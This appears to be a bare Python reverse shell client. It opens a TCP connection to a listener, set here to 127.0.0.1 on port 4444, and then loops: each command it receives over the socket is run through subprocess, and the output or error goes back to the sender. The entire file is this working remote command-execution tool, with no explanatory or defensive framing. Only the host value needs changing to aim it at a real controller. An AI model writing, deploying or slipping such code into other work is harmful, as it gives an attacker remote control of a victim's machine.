import socket as s
import subprocess
import shlex
from sys import stdin, stdout, stderr

host = '127.0.0.1'  
port = 4444

sock = s.socket(s.AF_INET, s.SOCK_STREAM)
sock.connect((host, port))

while True:
    try:
        cmd = sock.recv(1024).decode().strip()
        if not cmd:
            continue

        try:
            cmd_list = shlex.split(cmd)
            result = subprocess.run(cmd_list, capture_output=True, text=True)

            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = 'command executed'
        except Exception as e:
            output = f"Error: {str(e)}"

        sock.send(output.encode())

        stdin.flush()
        stdout.flush()
        stderr.flush()
    except Exception as e:
        print(f"Client Error: {e}")
        sock.close()
        break
